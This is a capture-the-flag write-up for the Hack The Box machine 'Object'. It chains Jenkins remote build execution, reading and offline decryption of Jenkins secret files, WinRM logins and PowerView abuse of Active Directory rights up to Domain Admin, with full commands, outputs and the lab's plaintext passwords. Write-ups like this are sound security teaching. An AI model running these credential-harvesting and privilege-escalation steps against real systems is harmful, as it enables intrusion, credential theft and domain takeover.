# HTB: Object — Writeup

**Target IP:** 10.129.96.147
**Attacker (Kali) IP:** 10.10.15.146

> Note: The machine was reset twice during this engagement. All commands/output below have been normalized to the **original IP (10.129.96.147)** for consistency.

---

## 1. Reconnaissance

### 1.1 Port Scanning (RustScan)

```
┌──(root㉿kali)-[/home/kali/object]
└─# rustscan -a 10.129.96.147                          
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Exploring the digital landscape, one IP at a time.

Open 10.129.96.147:80
Open 10.129.96.147:5985
Open 10.129.96.147:8080
```

### 1.2 Service/Version Scan (Nmap)

```
┌──(root㉿kali)-[/home/kali/object]
└─# nmap -A -p80,8080,5985 10.129.96.147 -oA nmap/nmap
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-30 19:34 +0000
Nmap scan report for 10.129.96.147
Host is up (0.34s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Mega Engines
| http-methods: 
|_  Potentially risky methods: TRACE
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp open  http    Jetty 9.4.43.v20210629
|_http-server-header: Jetty(9.4.43.v20210629)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 37.29 seconds
```

Three ports: **IIS (80)** — "Mega Engines" branding, nothing else on the page; **WinRM (5985)**; and **Jetty (8080)** — strongly suggests **Jenkins** running on Jetty.

### 1.3 Web Content Discovery

Port 80 was a dead end (no directories/files found beyond the static homepage). Port 8080 (Jetty) was far more productive:

```
┌──(root㉿kali)-[/home/kali/object]
└─# ffuf -u http://10.129.96.147:8080/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -mc 200,301,302,303,403 -fw 306

       v2.1.0-dev
________________________________________________
 :: URL              : http://10.129.96.147:8080/FUZZ
 :: Filter           : Response words: 306
________________________________________________

login                   [Status: 200, Size: 2120, Words: 208, Lines: 11, Duration: 351ms]
signup                  [Status: 200, Size: 7937, Words: 3393, Lines: 83, Duration: 321ms]
assets                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 347ms]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 308ms]
git                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 330ms]
oops                    [Status: 200, Size: 6552, Words: 241, Lines: 9, Duration: 377ms]
cli                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 798ms]
```

`login`, `signup`, `git`, `cli` — this is **Jenkins** (confirmed).

---

## 2. Initial Access — Jenkins Self-Registration → Remote Build Trigger RCE

### 2.1 Self-Service Signup

Jenkins allowed open self-registration. Signed up with throwaway `test`/`test` values and was granted an authenticated account.

### 2.2 Setting Up a Remotely-Triggerable Build

- Created a new Jenkins project/job.
- Under **Configure → Build Triggers → Trigger builds remotely**, set an authentication token (`test`).
- Under **Build → Add build step → Execute a Windows batch command**, entered `whoami`.
- Under the account's **Configuration → API Token**, generated a new token named `test`, yielding: `11cecf2b6de7e911005d2188da3a34b8b2`.

### 2.3 Triggering the Build via curl

Using Jenkins' remote build-trigger API (with basic-auth username:token):

```
┌──(root㉿kali)-[/home/kali/object]
└─# curl http://test:11cecf2b6de7e911005d2188da3a34b8b2@10.129.96.147:8080/job/test/build?token=test
```

### 2.4 Confirming Code Execution

```
http://10.129.96.147:8080/job/test/1/console
```

```
Started by remote host 10.10.15.146
Running as SYSTEM
Building in workspace C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\test
[test] $ cmd /c call C:\Users\oliver\AppData\Local\Temp\jenkins3308058061943453665.bat

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\test>whoami
object\oliver

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\test>exit 0 
Finished: SUCCESS
```

Arbitrary Windows batch command execution confirmed, running in the context of the Jenkins service account (**object\oliver**) despite the console header reporting "Running as SYSTEM" (that line reflects the Jenkins *master* process identity, not the actual OS execution context of the build step).

---

## 3. Enumeration via Jenkins RCE → Credential Extraction

Rather than popping an immediate reverse shell, enumeration and credential harvesting were done directly through the "Execute Windows batch command" build step, editing the command and re-triggering the job each time.

### 3.1 Locating the Jenkins Home & Admin Config

```
cd ../.. && dir
```
→ confirmed the Jenkins home directory layout (`.jenkins\users\`, `.jenkins\secrets\`, etc).

Found and read the admin user's config, which contained a **stored credential**:

```
type c:\Users\oliver\Appdata\local\jenkins\.jenkins\users\admin_17207690984073220035\config.xml
```

Relevant excerpt:
```xml
<com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
  <id>320a60b9-1e5c-4399-8afe-44466c9cde9e</id>
  <username>oliver</username>
  <password>{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}</password>
</com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
```

The password is stored in Jenkins' own encrypted format (`hudson.util.Secret`), decryptable offline if the master key and secret files can be obtained.

### 3.2 Exfiltrating the Jenkins Secrets (master.key + hudson.util.Secret)

```
type C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\master.key
```
→
```
f673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19
```

`hudson.util.Secret` is binary, so it was base64-encoded in place before printing to the console:

```
powershell -command "[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret'))"
```
→
```
gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=
```

Copied (decoded) into local files: `master.key`, `hudson.util.Secret`, and `credentials.xml` (the admin config XML containing the encrypted password blob).

### 3.3 Offline Decryption

Used the public **`jenkins_offline_decrypt.py`** script ([gquere/pwn_jenkins](https://github.com/gquere/pwn_jenkins)):

```
┌──(root㉿kali)-[/home/kali/object]
└─# python3 script.py master.key hudson.util.Secret credentials.xml
c1cdfun_d2434
```

**Recovered credential: `oliver` / `c1cdfun_d2434`**

---

## 4. Foothold — WinRM as oliver → user.txt

```
┌──(root㉿kali)-[/home/kali/object]
└─# evil-winrm -i 10.129.96.147 -u oliver -p c1cdfun_d2434
                                        
Evil-WinRM shell v3.9
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\oliver\Documents> whoami
object\oliver
*Evil-WinRM* PS C:\Users\oliver\Desktop> ls


    Directory: C:\Users\oliver\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/31/2026   4:45 AM             34 user.txt
```

**User flag obtained.**

### 4.1 Confirming an AD Environment

```
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/10/2021   3:20 AM                Administrator
d-----       10/26/2021   7:59 AM                maria
d-----       10/26/2021   7:58 AM                oliver
d-r---        4/10/2020  10:49 AM                Public
d-----       10/21/2021   3:44 AM                smith
```

```
*Evil-WinRM* PS C:\Users\oliver\Downloads> netstat -an | findstr LISTENING
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING
.....
<snip — remaining dynamic/ephemeral RPC ports (49664-49906) and IPv6/loopback DNS entries,
not relevant beyond confirming the host does its own DNS>
.....
```

Kerberos (88), LDAP (389/3268/3269), SMB (445), and the AD Web Services port (9389) are all listening locally — this box is a **Domain Controller** for `object.local`, even though those ports weren't exposed externally in the original nmap scan.

Other domain users **smith** and **maria** were also identified, and other users besides oliver — a clear signal to pivot to AD-focused enumeration (BloodHound).

---

## 5. AD Enumeration — SharpHound / BloodHound

### 5.1 Collecting AD Data

```
*Evil-WinRM* PS C:\Users\oliver\Downloads> upload SharpHound.exe
Info: Upload successful!
*Evil-WinRM* PS C:\Users\oliver\Downloads> .\SharpHound.exe -c all
2026-07-31T09:07:00|INFORMATION|SharpHound Version: 2.14.0.0
2026-07-31T09:07:01|INFORMATION|Resolved current domain to object.local
2026-07-31T09:07:01|INFORMATION|Beginning LDAP search for object.local
2026-07-31T09:07:01|INFORMATION|Collecting AdminSDHolder data for object.local
.....
<snip — several dozen repeated "[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL"
log lines, pure LDAP schema-cache progress spam with no exploit-relevant content>
.....
2026-07-31T09:07:09|INFORMATION|Status: 295 objects finished (+295 36.875)/s -- Using 70 MB RAM
2026-07-31T09:07:09|INFORMATION|SharpHound Enumeration Completed at 9:07 AM on 7/31/2026! Happy Graphing!

*Evil-WinRM* PS C:\Users\oliver\Downloads> download 20260731090700_BloodHound.zip
Info: Download successful!
```

### 5.2 Finding the First Abusable Edge

BloodHound analysis of **oliver**'s outbound object control revealed **`ForceChangePassword`** rights over the user **smith**.

---

## 6. Lateral Movement — oliver → smith → maria (ACL Abuse Chain)

### 6.1 Resetting smith's Password (ForceChangePassword)

PowerView's `Set-DomainUserPassword` cmdlet wasn't available until PowerView was actually imported (first attempt failed with a "not recognized" error before the module was loaded):

```
*Evil-WinRM* PS C:\Users\oliver\Downloads> upload powerview.ps1
Info: Upload successful!
*Evil-WinRM* PS C:\Users\oliver\Downloads> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Users\oliver\Downloads> $SecPassword = ConvertTo-SecureString 'c1cdfun_d2434' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\oliver\Downloads> $Cred = New-Object System.Management.Automation.PSCredential('OBJECT\oliver', $SecPassword)
*Evil-WinRM* PS C:\Users\oliver\Downloads> $UserPassword = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\oliver\Downloads> Set-DomainUserPassword -Identity smith -AccountPassword $UserPassword -Credential $Cred
```

Since `smith` is also a member of **Remote Management Users**, this immediately grants WinRM access as smith.

### 6.2 BloodHound on smith → GenericWrite on maria

Re-running BloodHound analysis (now as **smith**) revealed **`GenericWrite`** rights over the user **maria**.

### 6.3 Attempted Targeted Kerberoasting of maria (Abandoned)

`GenericWrite` allows setting arbitrary attributes on the target object, including `servicePrincipalName` — enabling a **targeted Kerberoast** attack (add a fake SPN to maria, then request a service ticket for it and crack the resulting hash offline). In short: a fake SPN (`nonexistent/meraj1312`, then a proper `MSSQLSvc/object.local:1433`) was added to maria via `Set-DomainObject`, and a TGS was requested via `Get-DomainSPNTicket`. However, every ticket obtained came back with the username/domain fields populated as **`UNKNOWN`** instead of `maria`/`OBJECT.LOCAL`, making the resulting `$krb5tgs$` hash uncrackable — this happens when the ticket request isn't correctly bound to an authenticated Kerberos context from the *current* WinRM session. After several attempts, this path was abandoned in favor of a different technique.

### 6.4 Pivoting: Abusing GenericWrite via Logon Script Injection

Since `GenericWrite` also allows setting maria's `scriptPath` (logon script) attribute, and outbound network callbacks were unreliable/firewalled for anything beyond ICMP (confirmed with a quick `tcpdump`/`ping` test), the technique switched to **staging a PowerShell logon script that writes command output to a file readable from the current session**, then triggering it and reading the results back — effectively turning maria's login/logoff cycle into a blind file-read primitive.

Confirmed egress and script execution:
```
*Evil-WinRM* PS C:\programdata> echo "ping 10.10.15.146" > ping.ps1
*Evil-WinRM* PS C:\programdata> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\programdata> Set-DomainObject -Identity maria -SET @{scriptpath="C:\\programdata\\ping.ps1"}
```
```
┌──(root㉿kali)-[/home/kali/object]
└─# sudo tcpdump -ni tun0 icmp
05:31:05 IP 10.129.96.147 > 10.10.15.146: ICMP echo request, id 1, seq 1104, length 40
05:31:05 IP 10.10.15.146 > 10.129.96.147: ICMP echo reply, id 1, seq 1104, length 40
.....
```

Confirmed the script runs on maria's logon cycle. Switched the script to dump directory listings to a readable file:

```
*Evil-WinRM* PS C:\programdata> echo "ls \users\maria\ > \programdata\out" > cmd.ps1
*Evil-WinRM* PS C:\programdata> Set-DomainObject -Identity maria -SET @{scriptpath="C:\\programdata\\cmd.ps1"}
*Evil-WinRM* PS C:\programdata> type out

    Directory: C:\users\maria

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---       10/25/2021   3:47 AM                Desktop
d-r---       10/25/2021  10:07 PM                Documents
```

Drilled into `Desktop`:
```
*Evil-WinRM* PS C:\programdata> echo "ls \users\maria\documents > \programdata\out; ls \users\maria\desktop\ > \programdata\out2" > cmd.ps1
*Evil-WinRM* PS C:\programdata> type out2

    Directory: C:\users\maria\desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/26/2021   8:13 AM           6144 Engines.xls
```

**`Engines.xls`** stood out on maria's Desktop. Used the same logon-script trick to copy it into the world-writable `C:\programdata` staging directory, then pulled it over the existing WinRM session:

```
*Evil-WinRM* PS C:\programdata> echo "copy \users\maria\desktop\Engines.xls \programdata\" > cmd.ps1
*Evil-WinRM* PS C:\programdata> download C:\programdata\Engines.xls Engines.xls
Info: Download successful!
```

### 6.5 Loot — Credentials in Engines.xls

```
┌──(root㉿kali)-[/home/kali/object]
└─# xdg-open Engines.xls
```

| Name | Quantity | Date Acquired | Owner | Chamber Username | Chamber Password |
|---|---|---|---|---|---|
| Internal Combustion Engine | 12 | 10/02/21 | HTB | maria | `d34gb8@` |
| Stirling Engine | 23 | 11/05/21 | HTB | maria | `0de_434_d545` |
| Diesel Engine | 4 | 02/03/21 | HTB | maria | `W3llcr4ft3d_4cls` |

Three candidate passwords for **maria**.

---

## 7. Credential Spray → WinRM as maria

```
┌──(root㉿kali)-[/home/kali/object]
└─# nxc winrm 10.129.96.147 -u maria -p passwords    
WINRM       10.129.96.147   5985   JENKINS          [*] Windows 10 / Server 2019 Build 17763 (name:JENKINS) (domain:object.local) 
WINRM       10.129.96.147   5985   JENKINS          [-] object.local\maria:d34gb8@
WINRM       10.129.96.147   5985   JENKINS          [-] object.local\maria:0de_434_d545
WINRM       10.129.96.147   5985   JENKINS          [+] object.local\maria:W3llcr4ft3d_4cls (Pwn3d!)
```

**Working: `maria` / `W3llcr4ft3d_4cls`** — NetExec's `(Pwn3d!)` flag indicates this account also has local admin rights on the box.

Per BloodHound, maria's "Outbound Object Control" also showed **`WriteOwner`** over the **Domain Admins** group.

---

## 8. Privilege Escalation — WriteOwner Abuse on Domain Admins → root.txt

### 8.1 Taking Ownership & Granting Full Rights

```
┌──(root㉿kali)-[/home/kali/object]
└─# evil-winrm -i 10.129.96.147 -u maria -p W3llcr4ft3d_4cls
                                        
Evil-WinRM shell v3.9
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\maria\Documents> cd Downloads
*Evil-WinRM* PS C:\Users\maria\Downloads> upload powerview.ps1
Info: Upload successful!
*Evil-WinRM* PS C:\Users\maria\Downloads> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Users\maria\Downloads> Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'maria'
*Evil-WinRM* PS C:\Users\maria\Downloads> Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity maria -Rights All
*Evil-WinRM* PS C:\Users\maria\Downloads> Add-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'
```

Chained the abuse: took ownership of the `Domain Admins` group object → granted `maria` full control ACL over it → added `maria` directly as a member.

### 8.2 Confirming Group Membership

```
*Evil-WinRM* PS C:\Users\maria\Downloads> net user maria
User name                    maria
...
Global Group memberships     *Domain Admins        *Domain Users
The command completed successfully.
```

### 8.3 Refreshing the Session & Confirming Elevated Token

The existing WinRM session's Kerberos token still reflected the old group membership, so a **fresh login** was needed to pick up the new `Domain Admins` membership:

```
┌──(root㉿kali)-[/home/kali/object]
└─# evil-winrm -i 10.129.96.147 -u maria -p W3llcr4ft3d_4cls
*Evil-WinRM* PS C:\Users\maria\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                    Type             SID
============================================= ================ =============================================
BUILTIN\Administrators                        Alias            S-1-5-32-544  ... Group owner
OBJECT\Domain Admins                          Group            S-1-5-21-4088429403-1159899800-2753317549-512
Mandatory Label\High Mandatory Level          Label            S-1-16-12288
```

`maria` is now a confirmed member of **Domain Admins** with a High Mandatory Level token.

### 8.4 Root Flag

```
*Evil-WinRM* PS C:\Users\maria\Documents> ls C:\Users\Administrator\Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/31/2026   8:13 PM             34 root.txt


*Evil-WinRM* PS C:\Users\maria\Documents> cat C:\Users\Administrator\Desktop\root.txt
93d***************************e8
```

**Root/Domain Admin obtained.**

---

## 9. Summary / Attack Chain

1. **Recon**: Nmap → IIS (80, static "Mega Engines" branding only), WinRM (5985), and Jetty/Jenkins (8080).
2. **Jenkins foothold**: Self-registered a free account, created a project with a remote build trigger + API token, and used curl against Jenkins' remote-build API to execute arbitrary Windows batch commands as the Jenkins service context (**object\oliver**).
3. **Credential harvesting via RCE**: Used the build-step RCE to read the admin's stored Jenkins credential (`config.xml`), plus the `master.key` and `hudson.util.Secret` files needed to decrypt it, then decrypted offline with the public `jenkins_offline_decrypt.py` → `oliver:c1cdfun_d2434`.
4. **User flag**: WinRM login as **oliver** → `user.txt`. Enumeration revealed additional domain users (`smith`, `maria`) and internal-only AD service ports, confirming this host is the domain controller for `object.local`.
5. **BloodHound (oliver)**: Found `ForceChangePassword` on **smith** → reset smith's password with PowerView → WinRM access as smith (member of Remote Management Users).
6. **BloodHound (smith)**: Found `GenericWrite` on **maria**. A targeted-Kerberoast attempt (adding a fake SPN and requesting a TGS) produced tickets with corrupted `UNKNOWN` identity fields and was abandoned.
7. **GenericWrite pivot**: Abused `GenericWrite` to point maria's logon script (`scriptPath`) at attacker-controlled PowerShell dropped in `C:\programdata`, using it as a blind file-read/exfil primitive (confirmed via an ICMP callback, then directory listings, then a direct file copy) to pull **`Engines.xls`** off maria's Desktop, which contained three candidate maria passwords.
8. **Credential spray**: NetExec against WinRM found the correct password — `maria:W3llcr4ft3d_4cls` — flagged as locally privileged (`Pwn3d!`).
9. **WriteOwner abuse**: BloodHound showed maria had `WriteOwner` on **Domain Admins**. Took ownership of the group, granted maria full ACL rights, and added maria as a member — then re-authenticated for a fresh Kerberos token reflecting the new membership.
10. **Domain Admin**: Confirmed `Domain Admins` membership and High Mandatory Level token → read `root.txt` directly from the Administrator's desktop.

### Key Vulnerabilities Chained
- Jenkins configured with open self-registration and no restriction on authenticated users creating/triggering builds → arbitrary remote code execution
- Sensitive Jenkins credential material (`master.key`, `hudson.util.Secret`, stored credentials) readable by the same low-privilege account that can execute builds
- Dangerous, overly permissive Active Directory ACLs chained across three separate accounts (`ForceChangePassword`, `GenericWrite`, `WriteOwner`) leading directly from an initial low-privilege foothold to Domain Admin
- Logon-script attributes writable via `GenericWrite`, usable as an arbitrary remote file-read/code-execution primitive even without clean network egress
